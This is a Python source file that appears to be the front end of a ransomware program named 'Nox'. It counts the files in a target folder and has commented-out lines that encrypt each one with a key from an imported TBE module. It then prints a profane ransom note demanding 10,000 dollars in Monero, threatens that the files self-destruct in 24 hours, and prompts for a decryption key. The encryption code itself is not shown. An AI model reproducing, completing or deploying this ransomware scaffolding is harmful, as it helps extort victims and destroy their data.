import TBE as t
import sys,os,time
import pathlib
import cliframe as cli


# files = []
# t.crawl("isolation",files)
# for f in files:
#     t.fencrypt(f,t.load_key())

files = [filepath for filepath in pathlib.Path("isolation").glob('**/*')]
#    if filepath.is_dir() == False:
#       t.fencrypt(filepath,t.load_key())



def main():
    cli.shittyborder("#",2)
    cli.typingPrint("Hello, friend.\nNox is your guest today, pity you. let\'s make this easy on ourselves and lets not suffer too much. \nYour files are encrypted,All of them, about "+str(len(files))+" Of them, also, we own your network, also, you're fucked.\nLet\'s make this quick and simple. you can use the input box below to deliver the key and decrypt your shit.\n Where do i get the key, you ask.\nSimple. you pay 10,000$ as MONERO currency to the address below, when the payment gets verified, you\'ll get the key in a email from an anonymous source.\n oh yeah btw all your files self-destruct in 24 hours. so stop fucking around.\n")
    print("\n"*3)
    cli.typingInput("Input the key: ")
main()

